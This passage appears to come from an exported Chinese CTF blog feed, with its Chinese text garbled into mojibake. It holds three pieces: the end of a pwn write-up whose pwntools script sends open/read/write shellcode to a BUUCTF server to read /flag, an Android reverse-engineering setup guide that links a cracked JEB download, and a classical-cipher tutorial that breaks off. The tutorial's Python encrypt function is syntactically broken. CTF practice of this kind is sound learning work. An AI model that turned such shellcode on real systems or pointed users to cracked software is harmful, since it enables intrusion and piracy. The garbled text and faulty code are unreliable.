<img src="http://static.zybuluo.com/hgggg/ta0dkemu0ix3xwscl3snqfop/8.png#" alt="8.png-44.1kB"></p>
<p>å‘ç°åªèƒ½ä½¿ç”¨open,read,write,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡open(file)+read(file)+write(file)æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p>
<h5 id="exp-v4"><a class="header-anchor" href="#exp-v4">Â¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25539</span>)</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;orw&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»0å¼€å§‹çš„Androidå®‰å…¨å­¦ä¹ ä¹‹ç¯å¢ƒæ­å»º</title>
    <url>/2021/11/15/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84Android%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/42.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>è¿™å‡ ä¸ªæœˆæ¥æ‰“äº†ä¸å°‘æ¯”èµ›ï¼Œæ„Ÿè§‰ç›®å‰çš„ä¸€äº›å¸¸è§„çš„glibc pwnåœ¨æ¯”èµ›ä¸­çš„å æ¯”è¶Šæ¥è¶Šå°‘ï¼Œä¸€äº›æ¯”è¾ƒæ–°é¢–çš„é¢˜ç›®å¦‚android pwn , pwnweb , chrome pwnï¼Œvmpwnä»¥åŠä¸€äº›å¼‚æ„çš„pwné¢˜å æ¯”æ¸æ¸å¢åŠ ï¼Œåœ¨åŠ ä¹‹æˆ‘è¿™ä¸ªèœç‹—é€†å‘èœçš„æ‰£è„šï¼Œæ‰€ä»¥å‡†å¤‡å¼€å§‹å­¦ä¸€äº›Androidé€†å‘çš„åŸºç¡€ï¼Œé€šè¿‡å­¦ä¹ å®‰å“é€†å‘æ¥æå‡è‡ªå·±çš„ä¸€äº›é€†å‘æŠ€èƒ½ï¼ŒåŒæ—¶äº†è§£ä¸€äº›Appå®‰å…¨æ–¹é¢çš„ä¸œè¥¿ï¼Œä¸ºæœªæ¥è¿›å‚åšä¸ªå‡†å¤‡ã€‚é—®äº†ä¸‹æé€†å‘çš„å­¦å¼Ÿç»™æˆ‘æ¨èäº†ä¸€å¥—<a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=742703&amp;highlight=%BD%CC%CE%D2%D0%D6%B5%DC">Androidé€†å‘çš„æ•™ç¨‹</a>ä»¥åŠAndroidé€†å‘å‘å±•çš„ä¸€ä¸ª<a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1244902&amp;highlight=%B0%B2%D7%BF%C4%E6%CF%F2">æŠ€èƒ½æ ‘</a> ï¼Œæ•…å†™è¯¥ç³»åˆ—ç¬”è®°æ¥è®°å½•å­¦ä¹ å†ç¨‹</p>
<!--more-->
<h2 id="é…ç½®JDK1-7ç¯å¢ƒ"><a class="header-anchor" href="#é…ç½®JDK1-7ç¯å¢ƒ">Â¶</a>é…ç½®JDK1.7ç¯å¢ƒ</h2>
<p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">ä¸‹è½½åœ°å€</a></p>
<pre><code>å®‰è£…ç›®å½•ä¸ºï¼šC:\Program Files\Java\jdk1.7.0_80
è®¾ç½®ç¯å¢ƒå˜é‡ä¸ºï¼š
JAVA_HOME=C:\Program Files\Java\jdk1.7.0_80
CLASSPATH=.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar
PATH=;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin
</code></pre>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/1212.png" alt="pic"></p>
<h2 id="å®‰è£…Android-Studio-2-2-3"><a class="header-anchor" href="#å®‰è£…Android-Studio-2-2-3">Â¶</a>å®‰è£…Android Studio 2.2.3</h2>
<p><a href="https://dl.google.com/dl/android/studio/install/2.2.3.0/android-studio-bundle-145.3537739-windows.exe">ä¸‹è½½åœ°å€</a></p>
<h2 id="å®‰è£…SDK"><a class="header-anchor" href="#å®‰è£…SDK">Â¶</a>å®‰è£…SDK</h2>
<p><a href="https://pan.baidu.com/s/1dEEoALN">ä¸‹è½½åœ°å€</a></p>
<p>æ ¹æ®https://www.52pojie.cn/thread-844248-1-1.html  ä¸­çš„æ•™ç¨‹å®‰è£…</p>
<h2 id="ä¸‹è½½-Android-killer"><a class="header-anchor" href="#ä¸‹è½½-Android-killer">Â¶</a>ä¸‹è½½ Android killer</h2>
<p><a href="https://down.52pojie.cn/Tools/Android_Tools/AndroidKiller_v1.3.1.zip">ä¸‹è½½åœ°å€</a></p>
<h2 id="ä¸‹è½½-apkTool-2-3-4"><a class="header-anchor" href="#ä¸‹è½½-apkTool-2-3-4">Â¶</a>ä¸‹è½½ apkTool 2.3.4</h2>
<p><a href="https://bitbucket.org/iBotPeaches/apktool/downloads/">ä¸‹è½½åœ°å€</a></p>
<h2 id="ä¸‹è½½rtl230-bpl-å¤§ä½¬å†™çš„AndroidKillerçš„è¡¥ä¸"><a class="header-anchor" href="#ä¸‹è½½rtl230-bpl-å¤§ä½¬å†™çš„AndroidKillerçš„è¡¥ä¸">Â¶</a>ä¸‹è½½rtl230.bpl (å¤§ä½¬å†™çš„AndroidKillerçš„è¡¥ä¸)</h2>
<p><a href="https://www.52pojie.cn/thread-658341-1-1.html">ä¸‹è½½åœ°å€</a></p>
<h2 id="å®‰è£…é›·ç”µæ¨¡æ‹Ÿå™¨"><a class="header-anchor" href="#å®‰è£…é›·ç”µæ¨¡æ‹Ÿå™¨">Â¶</a>å®‰è£…é›·ç”µæ¨¡æ‹Ÿå™¨</h2>
<p><a href="http://www.ldmnq.com/">ä¸‹è½½åœ°å€</a></p>
<h2 id="jebå®‰è£…"><a class="header-anchor" href="#jebå®‰è£…">Â¶</a>jebå®‰è£…</h2>
<p><a href="https://down.52pojie.cn/Tools/Android_Tools/jeb-2.2.7.201608151620_crack_qtfreet00.zip">ä¸‹è½½åœ°å€</a><br>
<a href="https://www.52pojie.cn/thread-742250-1-1.html">ä½¿ç”¨æ•™ç¨‹</a></p>
<h2 id="è¡¥å……"><a class="header-anchor" href="#è¡¥å……">Â¶</a>è¡¥å……</h2>
<p>å…³äºä¸Šè¿°çš„ç¯å¢ƒå¦‚ä½•é…ç½®<a href="https://www.52pojie.cn/thread-844248-1-1.html">å¤§ä½¬çš„æ–‡ç« </a>ä¸­å·²ç»è®²çš„ååˆ†è¯¦ç»†ï¼Œæˆ‘å°±æˆ‘é‡åˆ°çš„ä¸€äº›é—®é¢˜åšä¸€äº›è¡¥å……ã€‚</p>
<p>1.åœ¨ä½¿ç”¨Android killer çš„æ—¶å€™æç¤ºç¼–è¯‘å¤±è´¥</p>
<p>éœ€è¦åœ¨apktoolç®¡ç†ä¸­ï¼Œæ·»åŠ æˆ‘ä»¬ä¹‹å‰ä¸‹è½½å¥½çš„apktool<br>
<img src="https://gitee.com/Nss-harukii/images/raw/master/8.png" alt="pic"></p>
<p>2.å¦‚ä½•ä½¿ç”¨é›·ç”µæ¨¡æ‹Ÿå™¨</p>
<p>æ‰“å¼€é›·ç”µæ¨¡æ‹Ÿå™¨ï¼Œåœ¨è®¾ç½®é‡Œæ‰¾åˆ°å¼€å‘è€…é€‰é¡¹</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/9.png" alt="pic"></p>
<p>ç„¶åå¼€å¯USBè°ƒè¯•</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/10.png" alt="pic"></p>
<p>è¿™æ ·æˆ‘ä»¬çš„Android Studio å’Œ Android Killer å°±å¯ä»¥é€šè¿‡é›·ç”µæ¨¡æ‹Ÿå™¨æ¥è¿è¡Œç¨‹åºäº†</p>
]]></content>
      <categories>
        <category>é€†å‘</category>
      </categories>
      <tags>
        <tag>Androidç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤å…¸å¯†ç </title>
    <url>/2021/10/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/43.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="Cryptoå…¥é—¨ä¹‹å¤å…¸ç¯‡"><a class="header-anchor" href="#Cryptoå…¥é—¨ä¹‹å¤å…¸ç¯‡">Â¶</a>Cryptoå…¥é—¨ä¹‹å¤å…¸ç¯‡</h2>
<h2 id="1-å¤å…¸å¯†ç æ¦‚è¿°"><a class="header-anchor" href="#1-å¤å…¸å¯†ç æ¦‚è¿°">Â¶</a>1.å¤å…¸å¯†ç æ¦‚è¿°</h2>
<blockquote>
<ul>
<li>å¤å…¸å¯†ç æ˜¯å¯†ç å­¦ä¸­çš„å…¶ä¸­ä¸€ä¸ªç±»å‹ï¼Œå…¶å¤§éƒ¨åˆ†åŠ å¯†æ–¹å¼éƒ½æ˜¯åˆ©ç”¨<em><strong>æ›¿æ¢å¼å¯†ç </strong></em> æˆ– <em><strong>ç§»é¡¹å¼å¯†ç </strong></em>ï¼Œæœ‰æ—¶åˆ™æ˜¯ä¸¤è€…çš„æ··åˆã€‚å…¶äºå†å²ä¸­ç»å¸¸ä½¿ç”¨ï¼Œä½†ç°ä»£å·²ç»å¾ˆå°‘ä½¿ç”¨ï¼Œå¤§éƒ¨åˆ†çš„å·²ç»ä¸å†ä½¿ç”¨äº†ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œç»å…¸å¯†ç æ˜¯åŸºäºä¸€ä¸ªæ‹¼éŸ³å­—æ¯ï¼ˆåƒæ˜¯A-Zï¼‰ã€åŠ¨æ‰‹æ“ä½œæˆ–æ˜¯ç®€å•çš„è®¾å¤‡ã€‚å®ƒä»¬å¯èƒ½æ˜¯ä¸€ç§ç®€å•çš„å¯†ç æ³•ï¼Œä»¥è‡´äºä¸å¯ä¿¡èµ–çš„åœ°æ­¥ï¼Œç‰¹åˆ«æ˜¯æœ‰æ–°æŠ€æœ¯è¢«å‘å±•å‡ºæ¥åã€‚</li>
</ul>
</blockquote>
<p>å¤å…¸å¯†ç é€šå¸¸æå®¹æ˜“ç ´è§£ï¼Œå¤§éƒ¨åˆ†ç»å…¸å¯†ç éƒ½å¾ˆå®¹æ˜“å—åˆ°å”¯å¯†æ–‡æ”»å‡»æ³•æ”»å‡»ï¼ˆcipher text only attackï¼‰ã€‚è€Œåƒå‡¯æ’’è¿™ç§å¯†é’¥æ•°æœ‰é™çš„å¯†ç åˆ™å®¹æ˜“å—åˆ°çˆ†ç ´å¯†é’¥çš„æ–¹å¼ç ´è§£ï¼Œæ›¿ä»£å¼å¯†ç æœ‰æ¯”è¾ƒå¤§çš„å¯†é’¥æ•°ï¼Œä½†æ˜¯å®¹æ˜“è¢«é¢‘ç‡åˆ†æï¼Œå› ä¸ºæ¯ä¸ªå¯†ç å­—æ¯å„ä»£è¡¨äº†ä¸€ä¸ªæ˜æ–‡å­—æ¯ã€‚å¤šå­—æ¯æ›¿ä»£å¼å¯†ç å¯†ç ï¼Œåƒæ˜¯ç»´å‰å°¼äºšå¯†ç ä½¿ç”¨å¤šä¸ªæ›¿æ¢é˜²æ­¢äº†ç®€å•çš„é¢‘ç‡åˆ†æï¼Œç„¶è€Œï¼Œæ›´å…ˆè¿›çš„æŠ€æœ¯å¡è¥¿æ–¯åŸºè¯•éªŒå°±å¯ç”¨æ¥ç ´è§£è¿™ç±»å¯†ç ã€‚<br>
æ‰€ä»¥ï¼Œåœ¨ä¸»æµçš„CTFæ¯”èµ›ä¸­ï¼Œä¸€èˆ¬ä¸ä¼šæŠŠæŸç§å¤å…¸å¯†ç ä½œä¸ºä¸€ä¸ªé¢˜ç›®çš„æ ¸å¿ƒçŸ¥è¯†ç‚¹æ¥è€ƒï¼Œåœ¨æ¯”èµ›ä¸­é‡åˆ°æ—¶ï¼Œä¸€èˆ¬åœ¨æœç´¢å¼•æ“ä¸­æœç´¢å°±å¯ä»¥è§£å†³ã€‚</p>
<h2 id="2-ç¼–ç "><a class="header-anchor" href="#2-ç¼–ç ">Â¶</a>2.ç¼–ç </h2>
<h3 id="2-1-baseç¼–ç "><a class="header-anchor" href="#2-1-baseç¼–ç ">Â¶</a>2.1 baseç¼–ç </h3>
<pre><code>Base64
    Base64æ˜¯ç›®å‰ç½‘ç»œä¸Šæœ€å¸¸è§çš„ç”¨äºä¼ è¾“8bitå­—èŠ‚ç çš„ç¼–ç æ–¹å¼ä¹‹ä¸€ï¼Œæ˜¯ä¸€ç§åŸºäº64ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®çš„æ–¹æ³•ã€‚åœ¨ç¼–ç æ—¶ï¼Œ3ä¸ªå­—èŠ‚çš„æ•°æ®å…ˆåï¼ˆå…ˆæ¥çš„å­—èŠ‚å é«˜ä½ï¼‰æ”¾å…¥ä¸€ä¸ª24ä½çš„ç¼“å†²åŒºï¼Œæ•°æ®ä¸è¶³3å­—èŠ‚æ—¶åˆ™ç”¨0æ¥è¡¥è¶³ã€‚æ¯æ¬¡é€‰å‡º6bitæŒ‰ç…§å…¶å€¼æ¥é€‰æ‹© &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; ä¸­çš„å­—ç¬¦ä½œä¸ºç¼–ç è¾“å‡ºï¼Œè‹¥åŸæ•°æ®é•¿åº¦len mod 3 = 1 åˆ™åœ¨ç¼–ç ååŠ ä¸¤ä¸ª&quot;=&quot;,è‹¥len mod 3 =2 åˆ™åŠ ä¸€ä¸ª&quot;=&quot;,è€Œå½“åˆšå¥½ä¸º3çš„å€æ•°æ—¶åˆ™ä¸ä¼šå‡ºç°ç­‰å·ï¼Œå¦‚ä¸‹å›¾ã€‚ä»ä¸‹å›¾ä¸­ä¸éš¾å‘ç°å½“åŸæ•°æ®é•¿åº¦ä¸ä¸º3çš„å€æ•°æ—¶ï¼Œåœ¨ç¼–ç æ—¶ä¼šå†æœ«ä½è¡¥0ä½¿å…¶æˆä¸º6çš„å€æ•°ï¼Œè€Œåœ¨è§£ç æ—¶ä¼šè‡ªåŠ¨å»æ‰æ‰€è¡¥çš„0ï¼Œå¦‚æœåœ¨ç¼–ç çš„æ—¶å€™ä¸å…¨ç”¨0ä½å¡«å……è€Œå°†æˆ‘ä»¬æƒ³éšè—çš„æ•°æ®æ”¾å…¥å…¶ä¸­ï¼Œä¹Ÿå¹¶ä¸ä¼šå½±å“ç¼–ç çš„ç»“æœï¼Œè¿™å°±å¼•å‡ºäº†å¦å¤–ä¸€ä¸ªCTFé¢˜å‹ï¼šBase64éšå†™ã€‚
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/088gcrbndggz0d84gpzhfe19/20191230221011783.png" alt="20191230221011783.png-15.6kB"><br>
<img src="http://static.zybuluo.com/hgggg/mluejayhvknagd7w429ope1h/20191230221143554%20%281%29.png" alt="20191230221143554 (1).png-15.2kB"><br>
<img src="http://static.zybuluo.com/hgggg/d87dlk5xkqgua437bou3wyt2/20191230221118387.png" alt="20191230221118387.png-14.3kB"></p>
<pre><code>å…¶å®ƒBaseç¼–ç 
    é™¤äº†Base64ä»¥å¤–ï¼ŒBaes32å’ŒBase16ä¹Ÿæ˜¯è¾ƒä¸ºå¸¸è§çš„Baseç¼–ç ï¼Œå®ƒä»¬çš„ç¼–ç åŸç†å’ŒBasa64ä¸€æ ·ï¼Œåè€…Base16ä¹Ÿæ˜¯æˆ‘ä»¬å¸¸è¯´çš„Hexç¼–ç å³16è¿›åˆ¶ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰Base58ã€Baes36ã€Base91ã€uuencodeã€xxencodeç­‰ä¹Ÿæ›¾å‡ºç°åœ¨CTFçš„æ¯”èµ›ä¸­ï¼Œå®ƒä»¬åŸç†ç±»ä¼¼ï¼Œåªä¸è¿‡å®ƒä»¬ä½¿ç”¨çš„ç è¡¨ä¸åŒï¼Œè€Œåœ¨æ¯”èµ›ä¸­ä¹Ÿå¸¸æœ‰æ›¿æ¢ç è¡¨çš„Baesé¢˜ç›®ã€‚
</code></pre>
<h3 id="2-2-å…¶ä»–å¸¸è§ç¼–ç "><a class="header-anchor" href="#2-2-å…¶ä»–å¸¸è§ç¼–ç ">Â¶</a>2.2 å…¶ä»–å¸¸è§ç¼–ç </h3>
<pre><code>ASCIIç ï¼šåŒ…å«å¤§å°å†™å­—æ¯ï¼Œæ•°å­—ï¼Œå¸¸è§ç¬¦å·ç­‰ï¼Œæ˜¯äº’è”ç½‘é€šç”¨è¯­è¨€
æ‘©æ–¯ç”µç ï¼šç”±ç‚¹ï¼ˆ.ï¼‰ã€åˆ’ï¼ˆâ€”ï¼‰ç»„æˆ
URLç¼–ç ï¼šåˆç§°ç™¾åˆ†å·ç¼–ç ã€åªæ˜¯ç®€å•çš„åœ¨ç‰¹æ®Šå­—ç¬¦çš„å„ä¸ªå­—èŠ‚å‰åŠ ä¸Š%
jjencode&amp;aaencode:é’ˆå¯¹JSçš„ç¼–ç æ–¹å¼ï¼Œå‰è€…å°†JSä»£ç è½¬ä¸ºç¬¦å·å’Œå­—ç¬¦ä¸²ã€åè€…å°†ä¹‹è½¬æ¢ä¸ºå¸¸ç”¨ç½‘ç»œè¡¨æƒ…
ä¸€èˆ¬åœ°ï¼Œç¼–ç åªæ˜¯å¯¹åŸå§‹æ•°æ®è¿›è¡Œä¸€å®šåœ°å¤„ç†ï¼Œä½¿å…¶å˜å¾—æ–¹ä¾¿ä¼ è¾“ã€å‚¨å­˜ç­‰æ“ä½œï¼Œå¹¶ä¸æ˜¯ä¸ºäº†åŠ å¯†ä¿¡æ¯ï¼Œä¹Ÿæ²¡æœ‰å¯†é’¥ç­‰é¢å¤–ä¿¡æ¯ï¼Œåªè¦çŸ¥é“ç¼–ç æ–¹å¼å°±å¯ä»¥è¿˜åŸå¾—åˆ°æ•°æ®å†…å®¹ã€‚
</code></pre>
<h2 id="3-å•è¡¨æ›¿æ¢å¯†ç "><a class="header-anchor" href="#3-å•è¡¨æ›¿æ¢å¯†ç ">Â¶</a>3.å•è¡¨æ›¿æ¢å¯†ç </h2>
<h3 id="3-1å•è¡¨æ›¿æ¢åŸç†"><a class="header-anchor" href="#3-1å•è¡¨æ›¿æ¢åŸç†">Â¶</a>3.1å•è¡¨æ›¿æ¢åŸç†</h3>
<pre><code>å•è¡¨ä»£æ¢æ˜¯æŒ‡è‹±æ–‡å­—æ¯åœ¨è¿›è¡Œå¯†ç ç¼–ç æ›¿æ¢çš„æ—¶å€™ï¼Œæœ‰ä¸€å¼ å¯¹ç…§è¡¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºæ¯ä¸€ä¸ªå­—æ¯ï¼Œéƒ½æ˜¯å”¯ä¸€å¯¹åº”çš„ã€‚
ä¾‹å¦‚æºå­—æ¯è¡¨ä¸ºï¼šabcdefghijklmnopqrstuvwxyz
ç è¡¨ä¸ºï¼šqwertyuiopasdfghjklzxcvbnm
</code></pre>
<p>åŠ å¯†ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sä¸ºç è¡¨,mä¸ºå¯†æ–‡</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,s</span>)&#123;</span></span><br><span class="line"><span class="function">    <span class="title">c</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="title">i</span> <span class="title">in</span> <span class="title">range</span> (<span class="params"><span class="number">0</span>,<span class="built_in">len</span>(<span class="params">m</span>)</span>):</span></span><br><span class="line">        k = <span class="built_in">ord</span>(m[i])-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        c += s[k]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è§£å¯†ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,s</span>):</span></span><br><span class="line">    t = <span class="string">&quot;&quot;</span></span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        t = c[i]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> t==s[k]:</span><br><span class="line">                m += <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+k)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<h3 id="å‡¯æ’’å¯†ç "><a class="header-anchor" href="#å‡¯æ’’å¯†ç ">Â¶</a>å‡¯æ’’å¯†ç </h3>
<pre><code>å‡¯æ’’å¯†ç æ˜¯ä¸€ç§æœ€ä¸ºç®€å•çš„æ›¿æ¢å¯†ç ï¼Œå³å­—æ¯è¡¨ä¸Šçš„æ‰€æœ‰çš„å­—æ¯å‘ä¸€ä¸ªæ–¹å‘åç§»nä½åè¢«æ›¿æ¢ä¸ºå¯†æ–‡ï¼Œå¦‚ï¼šå½“n=2æ—¶ï¼ŒAå°±è¢«æ›¿æ¢æˆäº†Cï¼Œå‡¯æ’’åŠå…¶å˜ç§ç»å¸¸ä¼šå‡ºç°åœ¨CTFå¤å…¸å¯†ç å­¦çš„é¢˜ç›®ä¸­ï¼Œå…¶åŠ è§£å¯†å…¬å¼ä¸ºï¼š
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/fyyuo0q5dhv857h3n7ga45ap/123456.png" alt="123456.png-10.7kB"></p>
<pre><code>    ç”±æ­¤å¯ä»¥çœ‹å‡ºï¼Œå½“æˆ‘ä»¬çŸ¥é“ä¸€ä¸²å¯†æ–‡æ˜¯ç”±å‡¯æ’’åŠ å¯†å¾—æ¥çš„æ—¶å€™ï¼Œå³ä½¿æˆ‘ä»¬ä¸çŸ¥åˆ°å¯†é’¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç©·ä¸¾æ³•è½»æ˜“çš„ç ´è§£ã€‚
</code></pre>
<h3 id="ä»¿å°„å¯†ç ï¼ˆAffine-cipherï¼‰"><a class="header-anchor" href="#ä»¿å°„å¯†ç ï¼ˆAffine-cipherï¼‰">Â¶</a>ä»¿å°„å¯†ç ï¼ˆAffine cipherï¼‰</h3>
<pre><code>ä»¿å°„å¯†ç ä½œä¸ºä¸€ç§å•è¡¨æ›¿æ¢å¯†ç ï¼Œç è¡¨çš„æ¯ä¸ªå­—æ¯ç›¸åº”çš„å€¼ä½¿ç”¨ä¸€ä¸ªç®€å•çš„æ•°å­¦å‡½æ•°å¯¹åº”ä¸€ä¸ªæ•°å€¼
å…¶åŠ è§£å¯†å…¬å¼å¦‚ä¸‹ï¼š
</code></pre>
<p>åŠ å¯†ï¼š<img src="http://static.zybuluo.com/hgggg/ipwe3sgrjdy67i3wrq742axh/123456%20%282%29.png" alt="123456 (2).png-2.8kB"><br>
è§£å¯†ï¼š<img src="http://static.zybuluo.com/hgggg/mrl6gjagmgqzmwfwp9r8rc4t/123456%20%283%29.png" alt="123456 (3).png-3.1kB"><br>
ä¹˜æ³•é€†å…ƒæ±‚æ³•ï¼š<img src="http://static.zybuluo.com/hgggg/xw1my1dv05jobvaaocdtgzyd/123456%20%284%29.png" alt="123456 (4).png-1.8kB"><br>
<em><strong>å…³äºå…¬å¼</strong></em></p>
<pre><code>aä¸mäº’ç´ ï¼Œm=26,xä¸ºåŸæ–‡ï¼Œbä¸ºåç§»é‡
</code></pre>
<p><em><strong>å…³äºä¹˜æ³•é€†å…ƒ</strong></em></p>
<pre><code>    ä¾‹å¦‚ï¼Œæ±‚5å…³äºæ¨¡14çš„ä¹˜æ³•é€†å…ƒï¼š14=5*2+4ï¼Œ5=4*1+1è¯´æ˜5ä¸14äº’ç´ ï¼Œå­˜åœ¨5å…³äº14çš„ä¹˜æ³•é€†å…ƒã€‚1=5-4=5-(14-5*2)=5*3-14å› æ­¤ï¼Œ5å…³äºæ¨¡14çš„ä¹˜æ³•é€†å…ƒä¸º3ã€‚
</code></pre>
<p><em><strong>ç ´è§£</strong></em></p>
<pre><code>è‹¥a=1,åˆ™åˆšå¥½å°±æ˜¯å‡¯æ’’å¯†ç ã€‚
è‹¥a!=1,æˆ‘ä»¬å¯ä»¥çŸ¥é“m=26ï¼Œaä¸mäº’ç´ ï¼Œå³å¯å¾—åˆ°çš„å–å€¼èŒƒå›´ä¸ºï¼š1ï¼Œ3ï¼Œ5ï¼Œ7ï¼Œ9ï¼Œ11ï¼Œ13ï¼Œ15ï¼Œ17ï¼Œ19ï¼Œ21ï¼Œ23ï¼Œ25ä¸­çš„ä¸€ä¸ªï¼Œæ‰€ä»¥ä¸€å…±æœ‰12*26=312ç§å¯èƒ½çš„å¯†é’¥ï¼Œæ­¤æ—¶é‡‡ç”¨ç©·ä¸¾æ³•å³å¯æ”»å‡»ã€‚
è‹¥æˆ‘ä»¬å·²ç»çŸ¥é“äº†ä¸¤ä¸ªåŠ å¯†åçš„å­—æ¯c1,c2ã€‚é‚£ä¹ˆé€šè¿‡å…¬å¼c1 = a(x1+b) mod m ; c2 = a(x2+b) mod m;åˆ™c1-c2å¯å¾—ï¼šc1-c2=a(x1-x2) mod må³å¯æ±‚è§£aï¼Œå†ç”¨ç©·ä¸¾æ³•å¾—åˆ°bã€‚
</code></pre>
<h2 id="4-å¤šè¡¨æ›¿æ¢å¯†ç "><a class="header-anchor" href="#4-å¤šè¡¨æ›¿æ¢å¯†ç ">Â¶</a>4.å¤šè¡¨æ›¿æ¢å¯†ç </h2>
<h3 id="4-1å¤šè¡¨æ›¿æ¢åŸç†"><a class="header-anchor" href="#4-1å¤šè¡¨æ›¿æ¢åŸç†">Â¶</a>4.1å¤šè¡¨æ›¿æ¢åŸç†</h3>
<pre><code>ç”±äºå•è¡¨æ›¿æ¢å¯†ç å®¹æ˜“è¢«é¢‘ç‡åˆ†æç ´è§£ï¼Œäººä»¬æå‡ºäº†å¤šè¡¨æ›¿æ¢åŠ å¯†ï¼Œå³ç”¨å¤šä¸ªç è¡¨æ¥ä¾æ¬¡å¯¹æ˜æ–‡æ¶ˆæ¯çš„å­—æ¯è¿›è¡Œä»£æ¢ã€‚ç›¸è¾ƒäºå•è¡¨æ›¿æ¢ï¼Œå¤šè¡¨æ›¿æ¢åï¼Œå¯†æ–‡å‡ ä¹ä¸å†ä¿æŒåŸæ¥çš„é¢‘ç‡ï¼Œæ‰€ä»¥æ›´åŠ éš¾ä»¥ç ´è§£ï¼Œæˆ‘ä»¬ä¸€èˆ¬åªèƒ½é€šè¿‡å¯»æ‰¾ç®—æ³•å®ç°å¯¹åº”çš„å¼±ç‚¹è¿›è¡Œç ´è§£ã€‚åœ¨å¤šè¡¨æ›¿æ¢ä¸­ï¼Œä»¥Playfairã€Vigenereã€Nihilistã€Hillç­‰è¾ƒä¸ºå‡ºåï¼Œè¿™é‡Œæˆ‘ä»¬æŒ‡é€‰æ‹©åˆ†æå…¶ä¸­çš„å‡ ç§ã€‚
</code></pre>
<h3 id="4-2autokey-ç»´å‰å°¼äºš"><a class="header-anchor" href="#4-2autokey-ç»´å‰å°¼äºš">Â¶</a>4.2autokey/ç»´å‰å°¼äºš</h3>
<pre><code>ç»´å‰å°¼äºšå¯†ç ï¼Œä½œä¸ºæœ€ç»å…¸çš„å¤šè¡¨å¯†ç ï¼Œå…¶ç è¡¨å¦‚ä¸‹å›¾ï¼š
ç è¡¨ç¬¬ä¸€æ’å¯¹åº”æ˜æ–‡ï¼Œç¬¬ä¸€åˆ—å¯¹åº”å¯†é’¥ã€‚ä¾‹å¦‚ï¼š
æ˜æ–‡ä¸ºï¼ši like crypto
å¯†é’¥ä¸ºï¼šnssctf
å¯†æ–‡ä¸ºï¼šv damx heqhvh
</code></pre>
<p>ç ´è§£<br>
